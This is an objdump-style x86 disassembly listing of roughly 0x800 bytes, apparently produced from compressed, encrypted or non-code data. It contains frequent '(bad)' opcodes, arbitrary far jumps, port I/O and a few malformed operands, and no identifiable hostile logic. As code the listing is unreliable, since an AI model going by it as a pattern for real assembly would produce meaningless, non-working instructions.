  406a78:	or     bh,BYTE PTR [eax]
  406a7a:	(bad)  
  406a7b:	adc    al,0x33
  406a7d:	inc    ebp
  406a7e:	fs (bad) 
  406a80:	(bad)  
  406a81:	and    eax,0xf39c10a3
  406a86:	rcl    DWORD PTR [ebx],1
  406a88:	xchg   ecx,eax
  406a89:	mov    esi,0x7137f748
  406a8e:	sub    al,0x6b
  406a90:	add    eax,0xd20ea86e
  406a95:	retf   
  406a96:	jae    0x406b05
  406a98:	nop
  406a99:	xor    DWORD PTR [ecx-0x3b026956],0x6386e2b
  406aa3:	call   FWORD PTR [ebp-0x3a937fcb]
  406aa9:	in     eax,0x6a
  406aab:	add    DWORD PTR [edi-0x17],esi
  406aae:	(bad)  
  406aaf:	jecxz  0x406a7a
  406ab1:	sub    DWORD PTR [ebp+0x6b775bcd],eax
  406ab7:	or     edx,DWORD PTR [ecx+0x2]
  406aba:	cmp    dl,dh
  406abc:	imul   ebp,DWORD PTR [ebx+0x33],0x1844c5c9
  406ac3:	imul   ebp,DWORD PTR [ecx+0x53c253dd],0xffffff9b
  406aca:	call   0xe41c70f
  406acf:	fs adc bh,0xf8
  406ad3:	and    BYTE PTR [esi],dh
  406ad5:	dec    edi
  406ad6:	mov    ds:0x8954e3ee,eax
  406adb:	enter  0xcf07,0xf0
  406adf:	pop    esi
  406ae0:	jl     0x406a66
  406ae2:	pop    ecx
  406ae3:	lock mov al,ds:0x876ec0b6
  406ae9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406aea:	test   BYTE PTR [ebp+0x6d66627],ch
  406af0:	int3   
  406af1:	jecxz  0x406aff
  406af3:	icebp  
  406af4:	(bad)
  406af8:	xchg   ebx,eax
  406af9:	mov    al,ds:0x9a037e0e
  406afe:	rol    DWORD PTR [ebx-0x4c],0x89
  406b02:	push   es
  406b03:	add    DWORD PTR [edx+0x74],esi
  406b06:	mov    edx,DWORD PTR [esi]
  406b08:	mov    ebx,0x310669d3
  406b0d:	xchg   esp,eax
  406b0e:	cmp    al,cl
  406b10:	aam    0x67
  406b12:	push   es
  406b13:	add    eax,0xfae10854
  406b18:	repz cmp BYTE PTR [ebp-0x39],0xd1
  406b1d:	push   ecx
  406b1e:	aaa    
  406b1f:	jne    0x406b1d
  406b21:	xor    BYTE PTR [ecx-0x69],dl
  406b24:	xor    BYTE PTR [edi-0x4b],0xe4
  406b28:	sub    al,0xc3
  406b2a:	mov    ebp,DWORD PTR [eax+eiz*1+0x26]
  406b2e:	test   edi,eax
  406b30:	sub    esp,DWORD PTR ds:0xfa49ddcd
  406b36:	inc    eax
  406b37:	jg     0x406baa
  406b39:	fcomp  st(5)
  406b3b:	cmp    ebx,ecx
  406b3d:	or     ah,BYTE PTR [ebp+eiz*2+0x2c646eb7]
  406b44:	fistp  WORD PTR [ecx+0x2a]
  406b47:	aas    
  406b48:	gs in  eax,dx
  406b4a:	and    BYTE PTR [edx],dh
  406b4c:	adc    dl,bh
  406b4e:	lds    ecx,FWORD PTR [eax+0x1d]
  406b51:	jl     0x406bd2
  406b53:	icebp  
  406b54:	lock xchg esi,eax
  406b56:	nop
  406b57:	cmp    DWORD PTR [eax],0xbfd1c9f9
  406b5d:	mov    ecx,0xaf102c59
  406b62:	sbb    DWORD PTR [eax-0x34f67202],0xffffffcb
  406b69:	or     al,0x45
  406b6b:	cmp    esp,ebp
  406b6d:	sub    eax,0x13eee253
  406b72:	aas    
  406b73:	xchg   esi,eax
  406b74:	inc    edi
  406b75:	mov    esp,DWORD PTR [edi-0x19]
  406b78:	imul   edx,DWORD PTR gs:[esi-0x20],0xffffffb9
  406b7d:	xchg   edi,eax
  406b7e:	cld    
  406b7f:	dec    ebp
  406b80:	iret   
  406b81:	call   0xfc13:0x3673fbc5
  406b88:	in     al,0x51
  406b8a:	add    DWORD PTR [edi],ebx
  406b8c:	icebp  
  406b8d:	xchg   ebx,eax
  406b8e:	dec    esp
  406b8f:	adc    DWORD PTR [ebx-0x8d40beb],edx
  406b95:	inc    edx
  406b96:	and    BYTE PTR ss:[edx-0x74],0x2a
  406b9b:	test   BYTE PTR [ebp+0x13],0xaf
  406b9f:	pop    ebp
  406ba0:	cmp    ebx,DWORD PTR [edi-0x8f595b9]
  406ba6:	in     al,0x13
  406ba8:	mov    eax,0xdf549cfa
  406bad:	out    0xe7,al
  406baf:	stc    
  406bb0:	sbb    ah,BYTE PTR [ecx+0x50067135]
  406bb6:	mov    cl,0x38
  406bb8:	adc    bl,BYTE PTR [edi]
  406bba:	and    BYTE PTR [eax],al
  406bbc:	fsub   QWORD PTR [edx+0x4d]
  406bbf:	or     eax,0x5620a96c
  406bc4:	cmp    DWORD PTR [edi-0x49],0x6815aa3c
  406bcb:	xchg   dl,dl
  406bcd:	jecxz  0x406c4a
  406bcf:	rcr    BYTE PTR [ecx-0xc3cd7ad],cl
  406bd5:	cld    
  406bd6:	mov    al,0x4b
  406bd8:	mul    ch
  406bda:	cmp    ebp,DWORD PTR [esi-0x9]
  406bdd:	lock lods eax,DWORD PTR ds:[esi]
  406bdf:	dec    edx
  406be0:	push   0x584145bd
  406be5:	test   DWORD PTR [ecx+0x71b0953c],esp
  406beb:	aas    
  406bec:	pop    ebp
  406bed:	in     al,dx
  406bee:	push   ecx
  406bef:	add    cl,BYTE PTR [edx+0x1a]
  406bf2:	mov    eax,0x51e2fe65
  406bf7:	dec    eax
  406bf8:	or     DWORD PTR [edi],esp
  406bfa:	dec    ebp
  406bfb:	mov    ch,0xe5
  406bfd:	and    DWORD PTR [ebx],0xffffffa5
  406c00:	push   ebp
  406c01:	mov    ebx,0x58342609
  406c06:	lock ins DWORD PTR es:[edi],dx
  406c08:	(bad)  
  406c09:	and    eax,esp
  406c0b:	and    cl,bh
  406c0d:	ror    ebp,0xf2
  406c10:	daa    
  406c11:	inc    edi
  406c12:	imul   edi,DWORD PTR [ebp-0x71],0x637f3c61
  406c19:	retf   0x23d9
  406c1c:	(bad)  
  406c1d:	jmp    0xc246c967
  406c22:	bnd jg 0x406be2
  406c25:	xchg   BYTE PTR [eax+0x63d17292],dh
  406c2b:	xchg   edi,eax
  406c2c:	jl     0x406c63
  406c2e:	push   es
  406c2f:	loop   0x406c1d
  406c31:	arpl   WORD PTR [ebp+0x1],sp
  406c34:	adc    eax,0x69ffe32b
  406c39:	jmp    0x406c48
  406c3b:	inc    ebx
  406c3c:	pop    DWORD PTR [ecx+ebp*2-0x1c]
  406c40:	int    0xcf
  406c42:	shl    DWORD PTR [edi+ebx*2-0x4bac684b],1
  406c49:	dec    ecx
  406c4a:	sar    edx,1
  406c4c:	lds    edx,FWORD PTR [edi-0x3d]
  406c4f:	lea    esi,ds:0x7cf6b3de
  406c55:	pop    ss
  406c56:	cdq    
  406c57:	ins    DWORD PTR es:[edi],dx
  406c58:	mov    DWORD PTR [ebp-0x1c313c39],ebp
  406c5e:	iret   
  406c5f:	clc    
  406c60:	push   0x58
  406c62:	mov    WORD PTR [edx+0x63516e08],es
  406c68:	retf   0xd91c
  406c6b:	outs   dx,DWORD PTR ds:[esi]
  406c6c:	pop    ebx
  406c6d:	jl     0x406c8d
  406c6f:	scas   al,BYTE PTR es:[edi]
  406c70:	test   DWORD PTR [esi+0x2d],eax
  406c73:	and    edi,edx
  406c75:	cmp    al,0x78
  406c77:	jg     0x406c30
  406c79:	neg    BYTE PTR [ecx-0x36]
  406c7c:	inc    esp
  406c7d:	nop
  406c7e:	jp     0x406c82
  406c80:	sub    DWORD PTR [ebp+0x74309098],ebx
  406c86:	sbb    al,0x2d
  406c88:	and    BYTE PTR [esi-0x36],ch
  406c8b:	fdiv   QWORD PTR [eax]
  406c8d:	jle    0x406c35
  406c8f:	ins    DWORD PTR es:[edi],dx
  406c90:	push   ss
  406c91:	enter  0x7ac4,0xb9
  406c95:	clc    
  406c96:	add    eax,0x188d1628
  406c9b:	das    
  406c9c:	jg     0x406c41
  406c9e:	retf   0x683c
  406ca1:	adc    eax,0xfe66c391
  406ca6:	ret    0xf427
  406ca9:	fwait
  406caa:	inc    eax
  406cab:	or     eax,0xdf8a0bef
  406cb0:	push   eax
  406cb1:	adc    al,0xe4
  406cb3:	dec    ecx
  406cb4:	push   es
  406cb5:	leave  
  406cb6:	jle    0x406d10
  406cb8:	mov    bl,0x9
  406cba:	sub    al,0xaa
  406cbc:	shl    BYTE PTR [edi-0x1d],1
  406cbf:	inc    eax
  406cc0:	sbb    al,0x58
  406cc2:	mov    al,ds:0x77c7d372
  406cc7:	pop    esp
  406cc8:	in     al,0x33
  406cca:	pop    ss
  406ccb:	test   bh,0xd0
  406cce:	inc    esp
  406ccf:	clc    
  406cd0:	scas   eax,DWORD PTR es:[edi]
  406cd1:	daa    
  406cd2:	cdq    
  406cd3:	xchg   edx,eax
  406cd4:	and    ah,BYTE PTR [ebx]
  406cd6:	in     eax,dx
  406cd7:	dec    eax
  406cd8:	in     eax,0x5b
  406cda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cdb:	jbe    0x406d23
  406cdd:	push   0xb2e94553
  406ce2:	fs mov al,0xae
  406ce5:	rol    ah,1
  406ce7:	mov    esi,0x194cdb6b
  406cec:	cdq    
  406ced:	xchg   DWORD PTR [esi],ebx
  406cef:	aas    
  406cf0:	mov    bl,0x8
  406cf2:	nop
  406cf3:	imul   DWORD PTR [esi]
  406cf5:	hlt    
  406cf6:	jmp    0xb420:0xbcccaf34
  406cfd:	cld    
  406cfe:	jge    0x406d2a
  406d00:	pop    ebp
  406d01:	icebp  
  406d02:	mov    ecx,0xdc658700
  406d07:	retf   
  406d08:	fnstsw WORD PTR [ebp+0x78d09001]
  406d0e:	cli    
  406d0f:	inc    ecx
  406d10:	add    ebp,DWORD PTR [edi]
  406d12:	push   esi
  406d13:	sbb    DWORD PTR [edi+ecx*1],edx
  406d16:	cmc    
  406d17:	das    
  406d18:	or     DWORD PTR [esi+0x7d9423e1],ebx
  406d1e:	dec    edx
  406d1f:	mov    gs,WORD PTR [edi]
  406d21:	jo     0x406d8f
  406d23:	add    DWORD PTR [esi],0xffffffc4
  406d26:	and    DWORD PTR [ebx-0x119514ac],ebx
  406d2c:	jo     0x406d39
  406d2e:	stc    
  406d2f:	xchg   esp,eax
  406d30:	loope  0x406d1f
  406d32:	or     dh,dl
  406d34:	sbb    DWORD PTR [eax],0xfb46e4ee
  406d3a:	jmp    0x91a6:0xb835c970
  406d41:	jb     0x406d5e
  406d43:	stos   DWORD PTR es:[edi],eax
  406d44:	scas   eax,DWORD PTR es:[edi]
  406d45:	iret   
  406d46:	popf   
  406d47:	mov    dh,0xbe
  406d49:	gs pusha 
  406d4b:	popa   
  406d4c:	push   ebp
  406d4d:	das    
  406d4e:	dec    eax
  406d4f:	adc    BYTE PTR [edi],ah
  406d51:	fild   WORD PTR [eax+ebp*1+0xc]
  406d55:	out    0xcd,eax
  406d57:	push   0xd0ab243
  406d5c:	imul   DWORD PTR [ebp-0x4999aed2]
  406d62:	sbb    BYTE PTR [edx],al
  406d64:	aaa    
  406d65:	int3   
  406d66:	in     al,0x1f
  406d68:	(bad)  
  406d69:	hlt    
  406d6a:	jb     0x406d86
  406d6c:	mov    ds,WORD PTR [esi+ebp*2-0x6cb03932]
  406d73:	mov    ebp,0x57a63ef6
  406d78:	loope  0x406dc4
  406d7a:	outs   dx,BYTE PTR ds:[esi]
  406d7b:	iret   
  406d7c:	in     al,0x46
  406d7e:	cli    
  406d7f:	lds    eax,FWORD PTR [edx+0x4c8a0e7a]
  406d85:	mov    edi,0xe85539d1
  406d8a:	loopne 0x406dfe
  406d8c:	jbe    0x406d60
  406d8e:	adc    al,BYTE PTR [eax]
  406d90:	mov    ah,0xb2
  406d92:	stos   BYTE PTR es:[edi],al
  406d93:	or     BYTE PTR [ebx-0x6fd051be],al
  406d99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d9a:	sahf   
  406d9b:	cmp    bl,BYTE PTR [ebp-0x69]
  406d9e:	adc    al,BYTE PTR [ebp+0x35]
  406da1:	xor    edx,edx
  406da3:	xchg   edx,eax
  406da4:	or     BYTE PTR [edx],ch
  406da6:	xchg   ebp,eax
  406da7:	or     al,ch
  406da9:	jmp    0x8155:0x38c28baf
  406db0:	dec    esi
  406db1:	lea    edx,[ebx]
  406db3:	mov    al,ds:0x33a43d4e
  406db8:	and    ah,bl
  406dba:	sub    dh,BYTE PTR [eax+0x658f51a2]
  406dc0:	stc    
  406dc1:	shl    DWORD PTR [edi-0x15714a7c],cl
  406dc7:	inc    edi
  406dc8:	enter  0x4253,0x64
  406dcc:	push   edi
  406dcd:	pop    ecx
  406dce:	xor    eax,0xb1a40991
  406dd3:	jmp    0x6541a6a1
  406dd8:	or     ecx,DWORD PTR [ebp+0x1]
  406ddb:	add    ebx,edi
  406ddd:	call   0xc2ed1cc
  406de2:	mov    ebp,0x965a766b
  406de7:	(bad)  
  406de8:	mov    BYTE PTR [eax-0xd],0x71
  406dec:	(bad)  
  406ded:	nop
  406dee:	sbb    eax,0x6c698831
  406df3:	add    DWORD PTR [esi],ebp
  406df5:	inc    eax
  406df6:	jbe    0x406e04
  406df8:	sub    DWORD PTR [ebx+edi*1-0x38238a5b],esp
  406dff:	stos   BYTE PTR es:[edi],al
  406e00:	call   esi
  406e02:	xchg   edi,eax
  406e03:	mov    al,0x49
  406e05:	and    eax,0x52c861b7
  406e0a:	pop    ecx
  406e0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e0c:	sbb    al,0x72
  406e0e:	imul   ecx,DWORD PTR ds:0x80a81595,0xffffffd7
  406e15:	xchg   esp,eax
  406e17:	jo     0x406e7c
  406e19:	push   ecx
  406e1a:	ins    BYTE PTR es:[edi],dx
  406e1b:	jmp    0x93dc89c9
  406e20:	in     al,0x6d
  406e22:	(bad)  
  406e23:	fadd   DWORD PTR [edx]
  406e25:	jge    0x406e17
  406e27:	mov    ds:0xb00a052,eax
  406e2c:	ins    BYTE PTR es:[edi],dx
  406e2d:	push   esp
  406e2e:	pop    ebx
  406e2f:	dec    edi
  406e30:	sbb    eax,0x95b5dfdf
  406e35:	sub    BYTE PTR [edx+ebp*2],dh
  406e38:	sahf   
  406e39:	fadd   DWORD PTR [edx-0x4b9f4f6b]
  406e3f:	into   
  406e40:	fst    DWORD PTR [esi+0x3b]
  406e43:	inc    ebp
  406e44:	dec    esp
  406e45:	loopne 0x406e9e
  406e47:	fs pop ds
  406e49:	sub    ecx,0xffffffad
  406e4c:	out    0xf3,al
  406e4e:	jl     0x406e0f
  406e50:	mov    bl,BYTE PTR [ebp+ecx*8+0x35]
  406e54:	aad    0xd2
  406e56:	pop    ebx
  406e57:	mov    edx,0xdf89ef2c
  406e5c:	dec    edi
  406e5d:	or     eax,DWORD PTR [ecx]
  406e5f:	addr16 out dx,al
  406e61:	outs   dx,BYTE PTR ds:[esi]
  406e62:	or     eax,0xa66c1441
  406e67:	imul   ebp,DWORD PTR [eax+eiz*4+0x41e6a7b9],0x5539f2a4
  406e72:	sar    BYTE PTR [edi+0x4593b467],0x6b
  406e79:	sbb    DWORD PTR [edi+0x28],0xcb9021e7
  406e80:	inc    ebp
  406e81:	(bad)  
  406e82:	mov    BYTE PTR [ebx+0x2aef2a22],dh
  406e88:	jp     0x406ea0
  406e8a:	dec    esi
  406e8b:	adc    eax,0x48583f27
  406e90:	or     dl,bl
  406e92:	add    BYTE PTR [edi+0x3d393240],ah
  406e98:	outs   dx,BYTE PTR ds:[esi]
  406e99:	sbb    DWORD PTR [edx+0x42],0x3b5a867
  406ea0:	jecxz  0x406e24
  406ea2:	ror    BYTE PTR [ebp+0x2b],cl
  406ea5:	add    al,0xce
  406ea7:	sahf   
  406ea8:	fcom   DWORD PTR [edx+0x2700be98]
  406eae:	ins    BYTE PTR es:[edi],dx
  406eaf:	into   
  406eb0:	pop    ebp
  406eb1:	aam    0x13
  406eb3:	pop    esp
  406eb4:	xchg   esp,eax
  406eb5:	div    ch
  406eb7:	jg     0x406e47
  406eb9:	neg    BYTE PTR [esi+0x6d]
  406ebc:	add    bh,BYTE PTR [edi]
  406ebe:	jp     0x406f2f
  406ec0:	xchg   ecx,eax
  406ec1:	aas    
  406ec2:	ds pop ds
  406ec4:	push   es
  406ec5:	sbb    eax,DWORD PTR [esi]
  406ec7:	adc    edi,DWORD PTR [ebx+0x1b9d2b40]
  406ecd:	scas   al,BYTE PTR es:[edi]
  406ece:	push   ecx
  406ecf:	cmp    edi,DWORD PTR [ebx+ebx*4+0x56]
  406ed3:	jnp    0x406f1d
  406ed5:	xchg   edx,eax
  406ed6:	xor    ebp,DWORD PTR [eax+0x37]
  406ed9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406eda:	jmp    0x3bd7c3b5
  406edf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ee0:	sar    BYTE PTR [edx+ebx*2-0x58],cl
  406ee4:	sub    DWORD PTR [ecx+esi*4-0x2da681fc],ebp
  406eeb:	xchg   BYTE PTR [ebx-0x47],dh
  406eee:	cli    
  406eef:	mov    cs,WORD PTR [ecx+0x199d7212]
  406ef5:	pop    ebp
  406ef6:	push   0xd8d10c98
  406efb:	mov    bh,0xbc
  406efd:	push   es
  406efe:	or     dh,al
  406f00:	daa    
  406f01:	sbb    eax,0x3b60081c
  406f06:	rcl    BYTE PTR [esi-0x1b],0x1a
  406f0a:	es popa 
  406f0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f0d:	xor    DWORD PTR [edi+0x6c],0x39900286
  406f14:	fadd   DWORD PTR [ebx-0x72]
  406f17:	cld    
  406f18:	mov    ebp,0x61c56b8d
  406f1d:	popa   
  406f1e:	loopne 0x406f04
  406f20:	dec    edx
  406f21:	jl     0x406f28
  406f23:	jnp    0x406ea7
  406f25:	add    DWORD PTR [ecx],ecx
  406f27:	mov    dh,dh
  406f29:	sub    ch,BYTE PTR [ebx]
  406f2b:	dec    esp
  406f2c:	and    eax,0xaabb4689
  406f31:	push   0xfffffffe
  406f33:	dec    ebx
  406f34:	inc    ebp
  406f35:	ficom  WORD PTR [ebx-0x682b5435]
  406f3b:	ss leave 
  406f3d:	add    ebx,esp
  406f3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f40:	pop    ebp
  406f41:	inc    eax
  406f42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f43:	sar    BYTE PTR [eax-0x574800d0],cl
  406f49:	out    dx,eax
  406f4a:	add    bh,bl
  406f4c:	out    dx,eax
  406f4d:	pushf  
  406f4e:	stc    
  406f4f:	test   BYTE PTR [ebp+0x66],0xc
  406f53:	mov    eax,0x1c39629a
  406f58:	adc    DWORD PTR [ebx+edx*1+0x11],ebp
  406f5c:	cwde   
  406f5d:	(bad)  
  406f5e:	push   esp
  406f5f:	xchg   DWORD PTR [esp+ebp*1],edx
  406f62:	popa   
  406f63:	loopne 0x406f50
  406f65:	adc    BYTE PTR [ebx-0x5d],bh
  406f68:	and    ebx,eax
  406f6a:	xchg   edx,eax
  406f6b:	push   ds
  406f6c:	cdq    
  406f6d:	xchg   ebp,eax
  406f6e:	outs   dx,DWORD PTR ds:[esi]
  406f6f:	sahf   
  406f70:	push   0xffffffff
  406f72:	pushf  
  406f73:	xor    DWORD PTR ds:0x90c86941,0x70
  406f7a:	sub    DWORD PTR [edx-0x38],ebx
  406f7d:	out    0xd4,al
  406f7f:	or     esp,DWORD PTR ds:0xac088012
  406f85:	psraw  mm4,QWORD PTR [ebx-0x48]
  406f89:	cwde   
  406f8a:	mov    bh,0xf0
  406f8c:	mov    ebp,edx
  406f8e:	inc    edi
  406f8f:	jle    0x406f31
  406f91:	out    0x18,eax
  406f93:	lahf   
  406f94:	in     eax,dx
  406f95:	fnstenv [ebx]
  406f97:	pop    ds
  406f98:	push   0x106fb769
  406f9d:	rcr    BYTE PTR [eax],0x1
  406fa0:	popf   
  406fa1:	outs   dx,DWORD PTR ds:[esi]
  406fa2:	arpl   WORD PTR [ecx+ecx*4+0x460b74c3],di
  406fa9:	sub    al,bh
  406fab:	mov    bh,0x7
  406fad:	xchg   bl,bh
  406faf:	pushf  
  406fb0:	dec    esi
  406fb1:	jnp    0x406fe4
  406fb3:	sti    
  406fb4:	inc    esi
  406fb5:	or     al,0xe1
  406fb7:	push   0x67
  406fb9:	and    ch,bl
  406fbb:	std    
  406fbc:	mov    bh,ah
  406fbe:	imul   ebx,DWORD PTR [edx-0x254f05ed],0xffffff85
  406fc5:	or     edx,DWORD PTR [ebp+0x42]
  406fc8:	iret   
  406fc9:	lock and al,0xdd
  406fcc:	out    dx,eax
  406fcd:	lock mov DWORD PTR [ebp-0x34],ecx
  406fd1:	or     al,BYTE PTR [esi+0x3]
  406fd4:	pop    es
  406fd5:	test   eax,0xf40ba702
  406fda:	fwait
  406fdb:	and    DWORD PTR [ebx],esi
  406fdd:	fadd   QWORD PTR [ebx-0x7b74f4a7]
  406fe3:	sbb    edx,DWORD PTR [eax-0x5]
  406fe6:	imul   ecx,DWORD PTR [ebx-0x69bdd627],0x8c6a65cf
  406ff0:	inc    edi
  406ff1:	dec    dh
  406ff3:	push   eax
  406ff4:	fimul  WORD PTR es:[ebx-0x50]
  406ff8:	mov    cl,0x76
  406ffa:	aad    0xda
  406ffc:	jle    0x407004
  406ffe:	sbb    eax,0x920132bd
  407003:	mov    dh,BYTE PTR [esi-0x4cc9a4ae]
  407009:	mov    ebx,0x21e2da1d
  40700e:	jne    0x407089
  407010:	imul   ecx,DWORD PTR [ebx-0x2a],0xffffff9c
  407014:	lock inc ecx
  407016:	es cwde 
  407018:	test   al,0xeb
  40701a:	daa    
  40701b:	push   ecx
  40701c:	push   esp
  40701d:	neg    DWORD PTR cs:[edx]
  407020:	push   ebx
  407021:	inc    ecx
  407022:	jae    0x406fde
  407024:	dec    esp
  407025:	retf   
  407026:	hlt    
  407027:	mov    edx,0xbdc76040
  40702c:	rcl    ecx,0xea
  40702f:	mov    ebp,0x3cb64281
  407034:	xchg   BYTE PTR [ebx],dl
  407036:	xchg   esi,eax
  407037:	clc    
  407038:	jmp    0x55916e02
  40703d:	pop    ecx
  40703e:	aad    0x85
  407040:	adc    DWORD PTR [ecx],esi
  407042:	mov    edi,0x308e0b47
  407047:	xchg   BYTE PTR [edi-0x2],bh
  40704a:	mov    WORD PTR ds:[ebp+0x10],gs
  40704e:	pop    edx
  40704f:	cmp    DWORD PTR [edi-0x5c],edi
  407052:	mov    ebx,0x496c7534
  407057:	(bad)  
  407058:	fwait
  407059:	les    ebp,FWORD PTR [ebx+0x25a1751a]
  40705f:	jne    0x407089
  407061:	push   0x54
  407063:	fiadd  DWORD PTR [edi+0x3b]
  407066:	shl    DWORD PTR [eax+0x1121eb32],cl
  40706c:	ret    0x5c65
  40706f:	or     eax,0x7c74766
  407074:	jne    0x40708b
  407076:	and    eax,0x4facab48
  40707b:	inc    ebx
  40707c:	and    eax,0xe44fc47b
  407081:	xchg   DWORD PTR [edi-0x61],eax
  407084:	xor    esp,ebp
  407086:	xchg   ecx,eax
  407087:	cmp    eax,0x3b94a506
  40708c:	test   eax,0xd153fc76
  407091:	repz test eax,0x2193997a
  407097:	bound  esi,QWORD PTR ss:[ecx-0x663e3d1a]
  40709e:	pop    edx
  40709f:	jle    0x40703a
  4070a1:	icebp  
  4070a2:	mov    ah,0x8e
  4070a4:	mov    es,ebp
  4070a6:	dec    eax
  4070a7:	aam    0x7
  4070a9:	jmp    0x407034
  4070ab:	cmp    DWORD PTR [esi],0x45
  4070ae:	dec    eax
  4070af:	or     esi,DWORD PTR [ebx-0x4b]
  4070b2:	retf   
  4070b3:	dec    ebx
  4070b4:	pop    ebx
  4070b5:	into   
  4070b6:	call   0x2d72a36d
  4070bb:	dec    edx
  4070bc:	loopne 0x4070dd
  4070be:	call   FWORD PTR [esp+esi*8-0x626d9c51]
  4070c5:	push   eax
  4070c6:	mov    esi,db4
  4070c9:	rol    DWORD PTR [ecx],0x65
  4070cc:	sub    al,0x40
  4070ce:	mov    al,al
  4070d0:	jb     0x407128
  4070d2:	or     bl,BYTE PTR [ecx-0x1141c2d8]
  4070d8:	add    DWORD PTR [ebp+0x671c5ded],esp
  4070de:	jmp    0x793:0x11952438
  4070e5:	and    eax,0xe63c8081
  4070ea:	hlt    
  4070eb:	mov    ebp,0x63e926aa
  4070f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070f1:	ds fwait
  4070f3:	dec    edx
  4070f4:	in     eax,0x3b
  4070f6:	inc    esp
  4070f7:	xor    BYTE PTR [ebx+0x8c8613a],dh
  4070fd:	fdiv   DWORD PTR [ebp-0x3f]
  407100:	int    0x10
  407102:	dec    edx
  407103:	jo     0x407138
  407105:	fst    st(4)
  407107:	rol    dh,0x8b
  40710a:	xchg   ebp,eax
  40710b:	adc    DWORD PTR ds:0xe8b60f41,eax
  407111:	fldcw  WORD PTR [eax]
  407113:	mov    WORD PTR [edx+eax*1],?
  407116:	mov    WORD PTR [edx-0x74],?
  407119:	sub    DWORD PTR [ecx+edi*8-0x5e],ebx
  40711d:	inc    eax
  40711e:	sbb    BYTE PTR [ecx],0xae
  407121:	(bad)  
  407123:	inc    ecx
  407124:	jae    0x407120
  407126:	int3   
  407127:	sbb    al,0xfb
  407129:	leave  
  40712a:	rcl    BYTE PTR ds:0xbedbf949,1
  407130:	fs fwait
  407132:	sar    DWORD PTR [edx],1
  407134:	pop    ds
  407135:	fmul   DWORD PTR [edx]
  407137:	xor    BYTE PTR [ebp-0x4dee5e6d],ah
  40713d:	mov    ds:0x16672324,al
  407142:	push   edi
  407143:	push   edi
  407144:	mov    eax,0x9c01cdeb
  407149:	lods   al,BYTE PTR ds:[esi]
  40714a:	adc    ebx,edx
  40714c:	test   DWORD PTR [esi+0x7d],eax
  40714f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407150:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407151:	cmp    al,0x25
  407153:	(bad)  
  407154:	adc    al,0x50
  407156:	cmc    
  407157:	lods   al,BYTE PTR ds:[si]
  407159:	jl     0x4071b4
  40715b:	xor    BYTE PTR [edi+eiz*8+0xcf9c5c1],0x29
  407163:	jnp    0x4070ef
  407165:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407166:	leave  
  407167:	dec    esp
  407168:	les    edx,FWORD PTR [eax+0x2e7c3bf9]
  40716e:	in     eax,dx
  40716f:	pop    ss
  407170:	test   DWORD PTR [ebp+0x7d44c379],ecx
  407176:	mov    cl,0xdf
  407178:	inc    edi
  407179:	nop
  40717a:	test   eax,0x9afb3571
  40717f:	add    cl,dl
  407181:	sub    edi,DWORD PTR [edi+eax*1+0x63c11c49]
  407188:	mov    ds:0xa6a0964e,eax
  40718d:	imul   ecx,DWORD PTR [ebp+0x39],0x4d52ef7a
  407194:	xchg   BYTE PTR [eax],bh
  407196:	ror    DWORD PTR [eax],0x7f
  407199:	push   eax
  40719a:	fdiv   st,st(6)
  40719c:	sbb    DWORD PTR [edx+0x3],edx
  40719f:	(bad)  
  4071a0:	sbb    al,0x70
  4071a2:	test   BYTE PTR [eax],bh
  4071a4:	xor    ah,BYTE PTR [edi]
  4071a6:	scas   al,BYTE PTR es:[edi]
  4071a7:	jg     0x4071b7
  4071a9:	mov    dl,0xb6
  4071ab:	xor    DWORD PTR [edx],ebp
  4071ad:	loope  0x4071df
  4071af:	into   
  4071b0:	(bad)
  4071b4:	outs   dx,BYTE PTR ds:[esi]
  4071b5:	sub    BYTE PTR [ecx-0x23],ch
  4071b8:	dec    edx
  4071b9:	pop    ebx
  4071ba:	mov    ecx,0x67821459
  4071bf:	mov    ah,0xc0
  4071c1:	xchg   esp,eax
  4071c2:	fistp  DWORD PTR [esi+0xd]
  4071c5:	(bad)  
  4071c6:	in     al,dx
  4071c7:	mov    bl,0xab
  4071c9:	cli    
  4071ca:	xlat   BYTE PTR ds:[ebx]
  4071cb:	xor    esi,esi
  4071cd:	cwde   
  4071ce:	push   0x8f10ce38
  4071d3:	dec    edi
  4071d4:	xchg   DWORD PTR [ecx+0x6c],ecx
  4071d7:	or     dh,bl
  4071d9:	pop    ebx
  4071da:	outs   dx,BYTE PTR ds:[esi]
  4071db:	xchg   BYTE PTR gs:[esi-0x26bc08bd],bl
  4071e2:	xchg   edx,eax
  4071e3:	into   
  4071e4:	add    BYTE PTR [edx+0x79],dh
  4071e7:	adc    DWORD PTR [edx],ebx
  4071e9:	sub    ecx,DWORD PTR [ecx-0x67]
  4071ec:	mov    esi,0xb65da178
  4071f1:	call   0x38e6a346
  4071f6:	test   edi,edx
  4071f8:	in     eax,dx
  4071f9:	adc    ah,ah
  4071fb:	xchg   esi,eax
  4071fc:	pop    esi
  4071fd:	popa   
  4071fe:	sbb    DWORD PTR [eax-0x79],esi
  407201:	cmc    
  407202:	push   edi
  407203:	mul    ch
  407205:	mov    al,ds:0x49afbc1b
  40720a:	test   al,0x50
  40720c:	mov    ss,ebx
  40720e:	imul   edx,DWORD PTR [ebp-0x69],0xce7d1c50
  407215:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407216:	jl     0x40721c
  407218:	and    DWORD PTR [esi],0xffffff8a
  40721b:	inc    ecx
  40721c:	not    DWORD PTR [edi]
  40721e:	cmp    dl,BYTE PTR [eax+0x2b509ae7]
  407224:	sar    BYTE PTR [ebp-0x7b3b8aa3],1
  40722a:	mul    BYTE PTR [eax]
  40722c:	fistp  QWORD PTR [esi-0x125d5c87]
  407232:	cwde   
  407233:	mov    WORD PTR [ecx+0x62],cs
  407236:	fwait
  407237:	in     al,dx
  407238:	mov    ch,0x50
  40723a:	je     0x40729e
